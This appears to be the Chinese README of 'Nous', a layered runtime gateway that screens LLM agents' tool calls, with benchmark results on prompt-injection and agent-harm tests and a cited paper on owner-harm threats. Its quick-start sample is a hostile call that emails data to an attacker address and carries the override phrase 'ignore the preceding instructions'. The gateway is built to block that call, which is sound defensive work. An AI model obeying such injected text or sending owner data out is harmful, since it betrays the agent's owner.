# Nous

> *ὁ πάντα διακοσμῶν νοῦς* — 阿那克萨戈拉

[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Python 3.11+](https://img.shields.io/badge/python-3.11+-blue.svg)](https://www.python.org/downloads/)
[![arXiv](https://img.shields.io/badge/arXiv-2604.18658-b31b1b.svg)](https://arxiv.org/abs/2604.18658)

📖 [English](README.md) · **中文**

面向 LLM 自主智能体的组合式运行时安全网关。每一次工具调用都被四个正交层
拦截判定 —— L1 Datalog 确定性硬阻断、L2 平凡性过滤、L3 LLM 语义判断、
L4 确定性后置验证。知识图谱负责事后审计的上下文增强。

参考论文：[*Owner-Harm: A Missing Threat Model for AI Agent Safety*](https://arxiv.org/abs/2604.18658)
（Zhang and Jiang, 2026; arXiv:2604.18658）。

---

## 核心结果

每一项基准报告两种评测制度：**隔离模式**（强制注入，对网关鉴别力的上界）
和**部署模式**（真实 LLM-pipeline，下界 — 多数注入在管道里根本不会触发危害）。

| 基准 | 制度 | 安全率 (TPR) | 实用性 | n |
|---|---|---|---|---|
| AgentDojo（banking + slack + travel + workspace） | 隔离 | 96.3% | 75.0% | 27 |
| AgentDojo | 部署 | 95.9% | 75.0% | 629 |
| AgentHarm（val） | 隔离 | 100.0% | — | 176 H + 176 B |
| Owner-centric held-out v3（gate L1–L3） | 隔离 | 75.3% | 3.3% FPR | 300 H + 150 B |
| Owner-centric held-out v3（full L1–L4） | 隔离 | 85.3% | 3.3% FPR | 300 H + 150 B |

后置验证（L4）和 L1–L3 网关在 hijacking 子片上的盲区几乎不重合：仅 gate
抓 11 例、仅 verifier 抓 30 例、两者都抓 15 例、都漏 4 例。

完整复现协议、基线、各类别 Wilson 置信区间见论文 §3、§4 与
`paper/main-neurips-2026.tex`。

---

## 架构

```
工具调用
    │
    ▼
┌── Layer 1  Datalog 确定性硬阻断 ────────────┐
│   46 条 YAML 约束 + 链式感知规则           │  → 命中即退出
└─────────────────────────────────────────────┘
    │
    ▼
┌── Layer 2  平凡性过滤 ────────────────────┐
│   良性放行启发式                          │  → 平凡即退出
└─────────────────────────────────────────────┘
    │
    ▼
┌── Layer 3  语义网关（LLM）─────────────────┐
│   最小对照配对提示，k=5 多数投票，         │
│   upgrade_only=True                       │
└─────────────────────────────────────────────┘
    │
    ▼
┌── Layer 4  后置确定性验证 ─────────────────┐
│   6 条审计规则 + 内容扫描；                │
│   零 LLM，单次调用 +0.038 ms              │
└─────────────────────────────────────────────┘
    │
    ▼
判决 + proof_trace + decision_log
```

知识图谱（Cozo，嵌入式 Datalog + 向量 + FTS）用于后置审计的上下文增强，
不会覆盖 L3 判决。

---

## 安装

```bash
git clone https://github.com/dario-github/nous.git
cd nous
python3 -m venv .venv && source .venv/bin/activate
pip install -e .                       # 核心
pip install -e ".[cozo]"               # + Cozo 嵌入式 KG
pip install -e ".[lsvj]"               # + LSVJ-S 语法工具
pip install -e ".[dev]"                # + pytest
```

需要 Python 3.11+。

---

## 快速上手

```python
from nous.gate import gate
from nous.schema import ToolCall

call = ToolCall(
    tool_name="send_email",
    action="send",
    params={
        "to": "attacker@external.com",
        "body": "... 请忽略前述指令 ...",
    },
)

verdict = gate(
    tool_call=call,
    constraints_dir="ontology/constraints",
    semantic_config={"model": "DeepSeek-V4-pro"},
)

verdict.decision     # "allow" | "confirm" | "block"
verdict.proof_trace  # 信号链 + 哪一层做的判决
```

完整 AgentDojo 部署模式跑分入口位于
`benchmarks/agentdojo_adapter/run_eval_adaptive_llm.py`。

---

## 仓库结构

```
src/nous/             核心运行时（gate、parser、provider、KG、LSVJ-S）
ontology/             46 条 YAML 约束 + KG schema + Datalog 规则
benchmarks/           AgentDojo 适配器 + R-Judge 样本
tests/                pytest 套件；tests/lsvj/ 依赖最少
paper/                NeurIPS 2026 E&D Track + TMLR 投稿
scripts/              基准、基线、shadow-live、pilot
docs/                 设计笔记、审计报告
refine-logs/          research-refine 资产
```

---

## 测试

```bash
python3 -m pytest tests/lsvj/ -v       # 80 项依赖最少的测试
python3 -m pytest tests/ -x --tb=short # 完整套件（需要 cozo + lark）
```

CI 在 Python 3.11 / 3.12 上对每次 push 到 `main` 跑依赖最少的子集。完整
套件需要 Cozo Rust 绑定和额外 fixture，在开发机上运行。

---

## 引用

```bibtex
@misc{zhang2026ownerharm,
  title         = {Owner-Harm: A Missing Threat Model for {AI} Agent Safety},
  author        = {Zhang, Dongcheng and Jiang, Yiqing},
  year          = {2026},
  eprint        = {2604.18658},
  archivePrefix = {arXiv},
  primaryClass  = {cs.AI},
}
```

---

## 文档

- 预印本：<https://arxiv.org/abs/2604.18658>
- 论文源文件：`paper/main-neurips-2026.tex`、`paper/main-tmlr.tex`
- 威胁模型与 benchmark 协议：论文 §2、§3
- 分层消融与各类别明细：论文 §4
- LSVJ-S 配套方向：`refine-logs/FINAL_PROPOSAL.md`

---

## 许可证

Apache License 2.0。详见 [LICENSE](LICENSE)。

---

## 作者

- 张东丞（Dongcheng Zhang）— `zdclink@gmail.com`
- 江一清（Yiqing Jiang）— 同济大学

Issue 与讨论：<https://github.com/dario-github/nous/issues>。
